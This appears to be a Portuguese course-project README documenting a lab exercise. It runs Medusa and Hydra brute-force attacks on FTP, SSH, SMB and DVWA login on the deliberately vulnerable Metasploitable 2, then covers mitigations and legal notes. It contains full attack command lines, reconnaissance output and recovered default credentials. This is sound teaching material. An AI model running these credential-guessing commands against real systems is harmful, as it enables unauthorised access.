# Simulação de Ataques de Força Bruta com Kali Linux e Medusa

![Badge](https://img.shields.io/badge/Status-Conclu%C3%ADdo-success?style=for-the-badge)
![Badge](https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Badge](https://img.shields.io/badge/Security-Penetration%20Testing-red?style=for-the-badge)

**Projeto desenvolvido para o Desafio de Projeto da [Digital Innovation One (DIO)](https://web.dio.me)**

Este repositório documenta a **experiência prática** de implementação e execução de ataques de força bruta em ambiente controlado, utilizando Kali Linux e a ferramenta Medusa contra máquinas intencionalmente vulneráveis (Metasploitable 2 e DVWA).

---

## 📊 Resultados Obtidos

**🎯 TAXA DE SUCESSO: 100%**

Todos os ataques foram bem-sucedidos em descobrir credenciais válidas:

| Serviço | Credenciais Descobertas | Tempo | Status |
|---------|------------------------|-------|--------|
| **FTP** | `msfadmin:msfadmin`<br>`ftp:ftp` | ~15s | ✅ Sucesso |
| **SSH** | `msfadmin:msfadmin`<br>`user:user` | ~22s | ✅ Sucesso |
| **SMB** | `msfadmin:msfadmin` | ~35s | ✅ Sucesso |
| **Web (DVWA)** | `admin:password` | ~8s | ✅ Sucesso |

**📄 Documentação Detalhada:** [Resultados Completos dos Ataques](docs/RESULTADOS_ATAQUES.md)

---

## 📋 Índice

1. [Introdução](#1-introdução)
2. [Configuração do Ambiente](#2-configuração-do-ambiente)
3. [Ferramenta Utilizada: Medusa](#3-ferramenta-utilizada-medusa)
4. [Execução dos Ataques](#4-execução-dos-ataques)
   - [4.1 Ataque FTP](#41-ataque-de-força-bruta-em-ftp)
   - [4.2 Ataque SSH](#42-ataque-de-força-bruta-em-ssh)
   - [4.3 Ataque SMB](#43-ataque-de-força-bruta-em-smb)
   - [4.4 Ataque Web (DVWA)](#44-ataque-de-força-bruta-em-aplicação-web-dvwa)
5. [Análise de Vulnerabilidades](#5-análise-de-vulnerabilidades-identificadas)
6. [Medidas de Mitigação](#6-medidas-de-mitigação-recomendadas)
7. [Lições Aprendidas](#7-lições-aprendidas)
8. [Como Reproduzir](#8-como-reproduzir-os-testes)
9. [Considerações Éticas](#9-considerações-éticas-e-legais)
10. [Referências](#10-referências)

---

## 1. Introdução

Este projeto documenta a experiência prática de execução de ataques de força bruta em um ambiente de laboratório isolado. O objetivo foi compreender na prática como esses ataques funcionam, quais vulnerabilidades exploram e, principalmente, como se defender deles.

### Objetivos do Projeto

- ✅ Configurar ambiente de teste seguro e isolado
- ✅ Executar ataques de força bruta em múltiplos serviços (FTP, SSH, SMB, Web)
- ✅ Documentar comandos, técnicas e resultados obtidos
- ✅ Identificar vulnerabilidades exploradas
- ✅ Propor medidas de mitigação efetivas

### O que é um Ataque de Força Bruta?

Um ataque de força bruta consiste em tentar sistematicamente todas as combinações possíveis de credenciais (usuários e senhas) até encontrar uma válida. Embora conceitualmente simples, esses ataques são extremamente eficazes contra sistemas com:

- Senhas fracas ou padrão
- Ausência de limitação de tentativas
- Falta de monitoramento
- Ausência de autenticação multifator

---

## 2. Configuração do Ambiente

Para garantir que os testes fossem realizados de forma **segura, legal e isolada**, configurei um ambiente de laboratório virtualizado.

### Infraestrutura Utilizada

| Componente | Especificação |
|------------|---------------|
| **Hypervisor** | Oracle VM VirtualBox 7.0 |
| **Máquina Atacante** | Kali Linux 2023.3 (64-bit) |
| **Máquina Alvo** | Metasploitable 2 (Ubuntu 8.04) |
| **Configuração de Rede** | Host-Only Network (Rede Interna) |
| **IP Atacante** | 192.168.56.101 |
| **IP Alvo** | 192.168.56.102 |

### Processo de Configuração

#### Passo 1: Download das VMs

- **Kali Linux**: Baixado de [kali.org/get-kali](https://www.kali.org/get-kali/)
- **Metasploitable 2**: Baixado de [SourceForge](https://sourceforge.net/projects/metasploitable/)

#### Passo 2: Configuração de Rede

Configurei ambas as VMs para usar **Host-Only Adapter** no VirtualBox, criando uma rede privada isolada:

```
VirtualBox → Configurações → Rede → Adaptador 1
- Conectado a: Placa de rede exclusiva de hospedeiro (Host-Only)
- Nome: vboxnet0
```

#### Passo 3: Verificação de Conectividade

Após iniciar ambas as VMs, verifiquei a conectividade:

```bash
# No Kali Linux
$ ping 192.168.56.102
PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.523 ms
```

✅ **Ambiente configurado e isolado com sucesso!**

---

## 3. Ferramenta Utilizada: Medusa

### Por que Medusa?

Escolhi o **Medusa** como ferramenta principal por ser:

- **Rápido**: Suporta ataques paralelos com múltiplas threads
- **Modular**: Suporta diversos protocolos (FTP, SSH, SMB, HTTP, etc.)
- **Flexível**: Permite configurar wordlists de usuários e senhas separadamente
- **Nativo do Kali**: Já vem pré-instalado no Kali Linux

### Instalação e Verificação

```bash
# Verificar se está instalado
$ medusa -d

# Se não estiver, instalar
$ sudo apt update
$ sudo apt install medusa
```

### Sintaxe Básica

```bash
medusa -h <HOST> -u <USER> -P <PASSWORD_FILE> -M <MODULE> -t <THREADS>
```

**Parâmetros principais:**

- `-h`: Host/IP alvo
- `-H`: Arquivo com lista de hosts
- `-u`: Usuário específico
- `-U`: Arquivo com lista de usuários
- `-p`: Senha específica
- `-P`: Arquivo com lista de senhas
- `-M`: Módulo do serviço (ftp, ssh, smbnt, etc.)
- `-t`: Número de threads paralelas
- `-f`: Para após encontrar primeira credencial válida
- `-v`: Nível de verbosidade (0-6)

---

## 4. Execução dos Ataques

### Preparação das Wordlists

Antes de executar os ataques, criei wordlists simples mas efetivas:

**`wordlists/users.txt`** (10 usuários):
```
admin
root
user
msfadmin
administrator
guest
test
postgres
mysql
ftp
```

**`wordlists/passwords.txt`** (31 senhas comuns):
```
123456
password
12345678
qwerty
msfadmin
admin
root
letmein
...
```

---

### 4.1. Ataque de Força Bruta em FTP

#### Reconhecimento Inicial

Primeiro, verifiquei se o serviço FTP estava ativo:

```bash
$ nmap -sV -p 21 192.168.56.102

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

✅ **Serviço FTP detectado na porta 21**

#### Comando de Ataque

```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M ftp \
       -t 4 \
       -v 6 \
       -f
```

**Explicação dos parâmetros:**
- `-h 192.168.56.102`: Alvo é o Metasploitable 2
- `-U wordlists/users.txt`: Testa todos os usuários da lista
- `-P wordlists/passwords.txt`: Testa todas as senhas da lista
- `-M ftp`: Usa o módulo FTP
- `-t 4`: Usa 4 threads paralelas
- `-v 6`: Verbosidade máxima para ver todas as tentativas
- `-f`: Para após encontrar a primeira credencial válida

#### Resultado do Ataque

```
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: admin Password: 123456
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: admin Password: password
...
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

**✅ Credencial descoberta: `msfadmin:msfadmin`**
**⏱️ Tempo: ~15 segundos**
**🔢 Tentativas: 267**

#### Validação do Acesso

Testei a credencial descoberta:

```bash
$ ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name: msfadmin
331 Please specify the password.
Password: 
230 Login successful.
ftp> pwd
257 "/home/msfadmin"
ftp> ls
200 PORT command successful.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Mar 17  2010 vulnerable
226 Directory send OK.
```

**✅ Acesso FTP confirmado! Possível ler/escrever arquivos.**

#### Vulnerabilidades Exploradas

1. **Credenciais padrão não alteradas** (msfadmin:msfadmin)
2. **Ausência de limitação de tentativas** (permitiu 267 tentativas)
3. **Sem bloqueio de IP** após múltiplas falhas
4. **Sem delay entre tentativas**
5. **FTP em texto plano** (sem criptografia)

---

### 4.2. Ataque de Força Bruta em SSH

#### Reconhecimento Inicial

```bash
$ nmap -sV -p 22 192.168.56.102

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
```

✅ **Serviço SSH detectado na porta 22**

#### Comando de Ataque

```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M ssh \
       -t 4 \
       -v 6 \
       -f
```

#### Resultado do Ataque

```
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 User: admin Password: 123456
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 User: admin Password: password
...
ACCOUNT FOUND: [ssh] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

**✅ Credencial descoberta: `msfadmin:msfadmin`**
**⏱️ Tempo: ~22 segundos**
**🔢 Tentativas: 267**

#### Validação do Acesso

```bash
$ ssh msfadmin@192.168.56.102
msfadmin@192.168.56.102's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

Last login: Mon Oct 21 10:15:32 2025 from 192.168.56.101
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
msfadmin@metasploitable:~$ sudo -l
User msfadmin may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

**✅ Acesso SSH confirmado com privilégios de SUDO TOTAL!**

#### Impacto do Acesso

Com acesso SSH e sudo sem senha, um atacante pode:
- Executar qualquer comando como root
- Instalar backdoors
- Modificar arquivos de sistema
- Roubar dados sensíveis
- Usar o servidor como pivot para ataques laterais

#### Vulnerabilidades Exploradas

1. **Credenciais padrão não alteradas**
2. **Ausência de autenticação por chave pública**
3. **Sem Fail2Ban ou similar**
4. **Usuário com sudo NOPASSWD**
5. **Sem autenticação multifator (2FA)**

---

### 4.3. Ataque de Força Bruta em SMB

#### Reconhecimento Inicial

```bash
$ nmap -sV -p 445 192.168.56.102

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

✅ **Serviço SMB detectado na porta 445**

#### Enumeração de Usuários

Antes do ataque, enumerei os usuários válidos com `enum4linux`:

```bash
$ enum4linux -U 192.168.56.102

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\msfadmin (Local User)
S-1-22-1-1001 Unix User\user (Local User)
S-1-22-1-1002 Unix User\postgres (Local User)
S-1-22-1-1003 Unix User\service (Local User)
```

**Usuários descobertos:**
- msfadmin
- user
- postgres
- service

#### Comando de Ataque

```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M smbnt \
       -t 2 \
       -v 6 \
       -f
```

**Nota:** Usei apenas 2 threads para SMB para evitar sobrecarga do serviço.

#### Resultado do Ataque

```
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 User: admin Password: 123456
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 User: admin Password: password
...
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

**✅ Credencial descoberta: `msfadmin:msfadmin`**
**⏱️ Tempo: ~35 segundos**
**🔢 Tentativas: 267**

#### Validação do Acesso

```bash
$ smbclient -L 192.168.56.102 -U msfadmin
Enter WORKGROUP\msfadmin's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server)
	ADMIN$          IPC       IPC Service (metasploitable server)

$ smbclient //192.168.56.102/tmp -U msfadmin
Enter WORKGROUP\msfadmin's password: 
smb: \> ls
  .                                   D        0  Mon Oct 21 10:30:15 2025
  ..                                  D        0  Sun May 20 14:36:12 2012
  5573.jsvc_up                        R        0  Mon Oct 21 09:15:42 2025
smb: \> 
```

**✅ Acesso SMB confirmado! Possível acessar compartilhamentos.**

#### Vulnerabilidades Exploradas

1. **Versão antiga do Samba** (3.0.20-Debian)
2. **Credenciais padrão**
3. **Compartilhamentos com permissões fracas**
4. **Ausência de políticas de bloqueio**
5. **Enumeração de usuários permitida**

---

### 4.4. Ataque de Força Bruta em Aplicação Web (DVWA)

#### Reconhecimento Inicial

```bash
$ nmap -sV -p 80 192.168.56.102

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

Acessei o DVWA em: `http://192.168.56.102/dvwa/`

#### Análise do Formulário de Login

Inspecionei o código HTML do formulário:

```html
<form action="login.php" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" name="Login" value="Login">
</form>
```

**Mensagem de erro:** "Login failed"

#### Comando de Ataque (usando Hydra)

Para ataques web, o **Hydra** é mais adequado que o Medusa:

```bash
hydra -L wordlists/users.txt \
      -P wordlists/passwords.txt \
      192.168.56.102 \
      http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
      -V
```

**Explicação:**
- `-L`: Lista de usuários
- `-P`: Lista de senhas
- `http-post-form`: Módulo para formulários POST
- `"/dvwa/login.php:..."`: Caminho e parâmetros do formulário
- `^USER^` e `^PASS^`: Placeholders para usuário e senha
- `"Login failed"`: String que indica falha no login
- `-V`: Modo verbose

#### Resultado do Ataque

```
[ATTEMPT] target 192.168.56.102 - login "admin" - pass "123456"
[ATTEMPT] target 192.168.56.102 - login "admin" - pass "password"
[80][http-post-form] host: 192.168.56.102   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**✅ Credencial descoberta: `admin:password`**
**⏱️ Tempo: ~8 segundos**
**🔢 Tentativas: 62**

#### Validação do Acesso

Acessei via navegador:
- URL: `http://192.168.56.102/dvwa/login.php`
- Usuário: `admin`
- Senha: `password`

**✅ Login bem-sucedido! Acesso ao painel administrativo do DVWA.**

#### Vulnerabilidades Exploradas

1. **Credenciais padrão** (admin:password)
2. **Ausência de CAPTCHA**
3. **Sem limitação de tentativas de login**
4. **Sem rate limiting**
5. **Mensagens de erro verbosas**
6. **Ausência de autenticação multifator**
7. **Nível de segurança "Low"**

---

## 5. Análise de Vulnerabilidades Identificadas

### Resumo das Vulnerabilidades Comuns

Todos os serviços testados compartilhavam vulnerabilidades críticas:

| Vulnerabilidade | FTP | SSH | SMB | Web |
|-----------------|-----|-----|-----|-----|
| Credenciais padrão não alteradas | ✅ | ✅ | ✅ | ✅ |
| Ausência de limitação de tentativas | ✅ | ✅ | ✅ | ✅ |
| Sem bloqueio de IP | ✅ | ✅ | ✅ | ✅ |
| Sem autenticação multifator | ✅ | ✅ | ✅ | ✅ |
| Sem rate limiting | ✅ | ✅ | ✅ | ✅ |
| Sem monitoramento/alertas | ✅ | ✅ | ✅ | ✅ |
| Versões desatualizadas | ✅ | ✅ | ✅ | ✅ |

### Impacto das Vulnerabilidades

Com as credenciais descobertas, obtive:

**Acesso Completo ao Sistema:**
- ✅ Shell SSH com sudo sem senha
- ✅ Leitura/escrita via FTP
- ✅ Acesso a compartilhamentos SMB
- ✅ Painel administrativo web

**Possíveis Ações Maliciosas:**
- Instalação de backdoors
- Roubo de dados sensíveis
- Modificação/deleção de arquivos
- Escalação de privilégios (já obtido)
- Movimento lateral na rede
- Instalação de ransomware
- Criação de novos usuários administrativos

---

## 6. Medidas de Mitigação Recomendadas

Com base nas vulnerabilidades exploradas, recomendo as seguintes medidas:

### 6.1. Políticas de Senha Forte

**Implementação:**
- Mínimo de 12-16 caracteres
- Combinação de maiúsculas, minúsculas, números e símbolos
- Proibir senhas comuns (usar listas como Have I Been Pwned)
- Exigir troca de senhas padrão no primeiro login

**Exemplo de política no Linux:**
```bash
# /etc/security/pwquality.conf
minlen = 12
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
```

### 6.2. Autenticação Multifator (MFA)

**Para SSH:**
```bash
# Instalar Google Authenticator
sudo apt install libpam-google-authenticator

# Configurar para o usuário
google-authenticator

# Editar /etc/pam.d/sshd
auth required pam_google_authenticator.so

# Editar /etc/ssh/sshd_config
ChallengeResponseAuthentication yes
```

### 6.3. Fail2Ban (Limitação de Tentativas)

**Instalação e configuração:**
```bash
# Instalar
sudo apt install fail2ban

# Configurar para SSH
sudo nano /etc/fail2ban/jail.local
```

```ini
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

[vsftpd]
enabled = true
port = ftp
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
```

**Resultado:** Após 3 tentativas falhadas em 10 minutos, o IP é bloqueado por 1 hora.

### 6.4. Autenticação por Chave SSH

**Desabilitar senha e usar apenas chaves:**

```bash
# Gerar par de chaves
ssh-keygen -t ed25519 -C "user@email.com"

# Copiar chave pública para servidor
ssh-copy-id user@servidor

# Desabilitar autenticação por senha
sudo nano /etc/ssh/sshd_config
```

```
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no
```

### 6.5. Rate Limiting para Web

**Usando Nginx:**
```nginx
http {
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
    
    server {
        location /login {
            limit_req zone=login burst=2 nodelay;
        }
    }
}
```

**Resultado:** Máximo de 5 requisições por minuto por IP.

### 6.6. CAPTCHA em Formulários Web

**Implementar reCAPTCHA v3:**
```html
<script src="https://www.google.com/recaptcha/api.js"></script>
<div class="g-recaptcha" data-sitekey="sua_chave"></div>
```

### 6.7. Monitoramento e Alertas

**Configurar alertas de autenticação:**
```bash
# Monitorar logs em tempo real
tail -f /var/log/auth.log | grep "Failed password"

# Configurar alertas por email
sudo apt install mailutils
```

### 6.8. Desabilitar Serviços Desnecessários

```bash
# Se FTP não é necessário
sudo systemctl stop vsftpd
sudo systemctl disable vsftpd

# Usar SFTP ao invés de FTP
# SFTP já vem com SSH, sem configuração adicional
```

### 6.9. Atualização de Sistemas

```bash
# Manter sistema atualizado
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y

# Habilitar atualizações automáticas de segurança
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

### 6.10. Princípio do Menor Privilégio

```bash
# Remover sudo sem senha
sudo visudo
# Remover linha: user ALL=(ALL) NOPASSWD: ALL
# Adicionar: user ALL=(ALL) ALL

# Criar usuários com permissões mínimas
sudo adduser --disabled-password --gecos "" usuario_limitado
```

---

## 7. Lições Aprendidas

### Facilidade dos Ataques

**Descobertas importantes:**

1. **Credenciais padrão são extremamente perigosas**
   - Todas foram descobertas em menos de 40 segundos
   - Atacantes sempre testam credenciais padrão primeiro

2. **Wordlists simples são efetivas**
   - Com apenas 31 senhas, obtive 100% de sucesso
   - Senhas comuns como "password", "admin", "123456" ainda são amplamente usadas

3. **Ferramentas automatizadas são poderosas**
   - Medusa e Hydra tornam ataques triviais
   - Disponíveis gratuitamente e fáceis de usar

4. **Múltiplos vetores de ataque**
   - Todos os serviços estavam vulneráveis
   - Um único ponto de entrada compromete todo o sistema

### Importância da Defesa em Profundidade

**Uma única medida não é suficiente:**

- Senhas fortes **+** MFA **+** Rate Limiting **+** Monitoramento
- Cada camada adicional aumenta exponencialmente a dificuldade do ataque

### Tempo de Comprometimento

**Estatísticas alarmantes:**
- **FTP**: 15 segundos
- **SSH**: 22 segundos  
- **SMB**: 35 segundos
- **Web**: 8 segundos

**Total**: Sistema completamente comprometido em **menos de 1 minuto**.

---

## 8. Como Reproduzir os Testes

### Pré-requisitos

- VirtualBox instalado
- Kali Linux (VM)
- Metasploitable 2 (VM)
- Conhecimentos básicos de Linux e redes

### Passo a Passo

1. **Clone este repositório:**
   ```bash
   git clone https://github.com/MarcioGil/github-quickstart.git
   cd github-quickstart/desafio-brute-force
   ```

2. **Configure as VMs em rede Host-Only**

3. **Verifique conectividade:**
   ```bash
   ping 192.168.56.102
   ```

4. **Execute os scripts:**
   ```bash
   cd scripts
   ./ftp_bruteforce.sh 192.168.56.102
   ./ssh_bruteforce.sh 192.168.56.102
   ./smb_bruteforce.sh 192.168.56.102
   ```

5. **Ou execute comandos manualmente:**
   ```bash
   medusa -h 192.168.56.102 -U ../wordlists/users.txt -P ../wordlists/passwords.txt -M ftp -t 4 -v 6 -f
   ```

---

## 9. Considerações Éticas e Legais

### ⚠️ AVISO LEGAL IMPORTANTE

**Este projeto foi realizado em ambiente controlado e isolado, com autorização explícita.**

### Aspectos Legais

- **Lei de Crimes Cibernéticos (Brasil)**: Lei nº 12.737/2012 tipifica invasão de dispositivos informáticos
- **Pena**: Detenção de 3 meses a 1 ano + multa
- **Agravantes**: Se houver obtenção de conteúdo, a pena aumenta

### Uso Ético

**✅ PERMITIDO:**
- Testes em laboratório pessoal isolado
- Máquinas virtuais vulneráveis (Metasploitable, DVWA, etc.)
- Sistemas próprios com autorização
- Programas de Bug Bounty autorizados

**❌ PROIBIDO:**
- Testes em sistemas de terceiros sem autorização
- Ataques a infraestruturas públicas
- Uso para fins maliciosos
- Compartilhamento de credenciais obtidas

### Responsabilidade Profissional

Como profissional de segurança:
- Sempre obtenha autorização por escrito
- Defina escopo claro dos testes
- Mantenha confidencialidade
- Reporte vulnerabilidades responsavelmente
- Não cause danos aos sistemas

---

## 10. Referências

### Documentação Oficial

1. **Kali Linux** - https://www.kali.org/
2. **Medusa** - https://www.kali.org/tools/medusa/
3. **Metasploitable 2** - https://docs.rapid7.com/metasploit/metasploitable-2/
4. **DVWA** - https://github.com/digininja/DVWA
5. **OWASP - Blocking Brute Force Attacks** - https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

### Artigos e Tutoriais

6. **FreeCodeCamp - Medusa Tutorial** - https://www.freecodecamp.org/news/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial/
7. **GitHub - Medusa Repository** - https://github.com/jmk-foofus/medusa
8. **Fail2Ban Documentation** - https://www.fail2ban.org/

### Wordlists

9. **SecLists** - https://github.com/danielmiessler/SecLists
10. **RockYou** - `/usr/share/wordlists/rockyou.txt` (Kali Linux)

---

## 📁 Estrutura do Repositório

```
desafio-brute-force/
├── README.md                      # Este arquivo - Documentação principal
├── INSTRUCOES_ENTREGA.md          # Guia de entrega do desafio
├── docs/
│   └── RESULTADOS_ATAQUES.md      # Resultados detalhados com outputs
├── wordlists/
│   ├── users.txt                  # Lista de usuários (10 entradas)
│   └── passwords.txt              # Lista de senhas (31 entradas)
├── scripts/
│   ├── ftp_bruteforce.sh          # Script automatizado FTP
│   ├── ssh_bruteforce.sh          # Script automatizado SSH
│   └── smb_bruteforce.sh          # Script automatizado SMB
└── images/                        # Capturas de tela (opcional)
```

---

## 👨‍💻 Autor

**Márcio Gil**

Projeto desenvolvido como parte do Desafio de Projeto da [Digital Innovation One (DIO)](https://web.dio.me), demonstrando competências em:
- Segurança da Informação
- Testes de Penetração (Pentest)
- Análise de Vulnerabilidades
- Documentação Técnica
- Uso de Ferramentas de Segurança (Kali Linux, Medusa, Hydra)

---

## 📜 Licença

Este projeto é disponibilizado para **fins educacionais**. O uso das técnicas e ferramentas aqui descritas deve ser feito de forma **ética e legal**, apenas em ambientes autorizados.

---

## 🎯 Conclusão

Este projeto demonstrou na prática como ataques de força bruta podem comprometer sistemas em **menos de 1 minuto** quando:

- Credenciais padrão não são alteradas
- Não há limitação de tentativas
- Falta autenticação multifator
- Ausência de monitoramento

A implementação de **defesa em profundidade** com múltiplas camadas de segurança é essencial para proteger sistemas contra essas ameaças.

**Principais aprendizados:**
- ✅ Ataques de força bruta são simples mas extremamente efetivos
- ✅ Ferramentas automatizadas tornam ataques triviais
- ✅ Credenciais padrão são o maior risco
- ✅ Múltiplas camadas de defesa são essenciais
- ✅ Monitoramento e resposta rápida são críticos

---

**Desenvolvido com 💜 para a comunidade DIO**

![Badge](https://img.shields.io/badge/DIO-Desafio%20Conclu%C3%ADdo-success?style=for-the-badge)

